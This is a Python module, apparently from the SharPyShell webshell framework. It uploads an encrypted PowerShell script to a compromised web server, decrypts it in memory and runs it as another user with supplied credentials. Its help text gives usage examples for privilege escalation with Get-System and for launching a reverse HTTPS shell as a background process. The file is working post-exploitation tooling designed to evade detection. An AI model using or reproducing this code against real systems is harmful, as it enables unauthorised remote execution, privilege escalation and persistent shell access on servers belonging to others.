from modules.upload import Upload
from modules.invoke_ps_module import Invoke_ps_module, ModuleException
from modules.runas_ps import Runas_ps
import traceback


class InvokePsModuleAsModuleException(ModuleException):
    pass


class Invoke_ps_module_as(Invoke_ps_module):
    _exception_class = InvokePsModuleAsModuleException
    short_help = "Run a ps1 script on the target server as a specific user"
    complete_help = r"""
        This module upload and executes (as a specific user) a powershell module that exists
        in the 'ps_modules/' SharPyShell directory.
        The ps1 module will be uploaded to the target server in an encrypted form and get decrypted at runtime in  
        memory.
        Then a new process, out of calling thread of w3wp.exe, will be spawned with the permission of the
        specified user.
        It is possible to execute additional code to the uploaded module in order to use functions inside of it or
        add additional behaviours. 
        
        Usage:
            #invoke_ps_module_as ps_module username password [appended_code] [domain] [process_timeout_ms] [logon_type]
                                            
        Positional arguments:
            ps_module               name of a .ps1 module existent in the 'ps_modules/' directory
            username                username of the user
            password                password of the user
            appended_code           powershell code to be run within the module uploaded
                                    Default: ''
            domain                  domain of the user, if in a domain. 
                                    Default: ''
            process_timeout_ms      the waiting time (in ms) to use in the WaitForSingleObject() function.
                                    This will halt the process until the spawned process ends and sent
                                    the output back to the webshell.
                                    If you set 0 an async process will be created and no output will be retrieved.
                                    Default: '60000'
            logon_type              the logon type for the spawned process.
                                    If you set Interactive (2) logon type you will face some restriction problems with
                                    admin account.
                                    Default: '3'
        Examples:
            Run a module as a specific local user:
                #invoke_ps_module_as Get-System.ps1 user1 password1 ';Get-System -Whoami'
            Run a module as a specific domain user:
                #invoke_ps_module_as Get-System.ps1 user1 password1 ';Get-System -Whoami' 'domain'
            Run a module as an async process:
                #invoke_ps_module_as reverse_shell_https.ps1 user1 password1 '' '' '0'    
            Run a module as a specific user and with a logon type 4 (batch) for the process spawned:
                #invoke_ps_module_as Get-System.ps1 user1 password1 ';Get-System -Whoami' '' '60000' '4'  
    """

    __default_appended_code = ''
    __default_domain = ''
    __default_process_timeout_ms = '60000'
    __default_logon_type = '3'

    def __init__(self, password, channel_enc_mode, module_settings, request_object):
        Invoke_ps_module.__init__(self, password, channel_enc_mode, module_settings, request_object)
        self.upload_module_object = Upload(password, channel_enc_mode, module_settings, request_object)
        self.runas_ps_object = Runas_ps(password, channel_enc_mode, module_settings, request_object)

    def __parse_run_args(self, args):
        if len(args) < 3:
            raise self._exception_class('#invoke_ps_module_as: Not enough arguments. 3 Argument required.\n')
        args_parser = {k: v for k, v in enumerate(args)}
        ps_module = args_parser.get(0)
        username = args_parser.get(1)
        password = args_parser.get(2)
        appended_code = args_parser.get(3, self.__default_appended_code)
        domain = args_parser.get(4, self.__default_domain)
        process_ms_timeout = args_parser.get(5, self.__default_process_timeout_ms)
        logon_type = args_parser.get(6, self.__default_logon_type)
        return ps_module, username, password, appended_code, domain, process_ms_timeout, logon_type

    def run(self, args):
        try:
            ps_module, username, password, appended_code,\
                domain, process_ms_timeout, logon_type = self.__parse_run_args(args)
            enc_module_path = self._lookup_module(ps_module)
            enc_appended_code_path  = self._gen_appended_code(appended_code)
            ps_code = self._create_request([enc_module_path, enc_appended_code_path])
            runas_params = [username, password, domain, process_ms_timeout, logon_type]
            parsed_response = self._parse_response(self.runas_ps_object.run([ps_code] + runas_params))
            parsed_response = '\n\n\nModule executed correctly:\n' + parsed_response
        except ModuleException as module_exc:
            parsed_response = str(module_exc)
        except Exception:
            parsed_response = '{{{' + self._exception_class.__name__ + '}}}' + '{{{PythonError}}}\n' + str(
                traceback.format_exc())
        return parsed_response
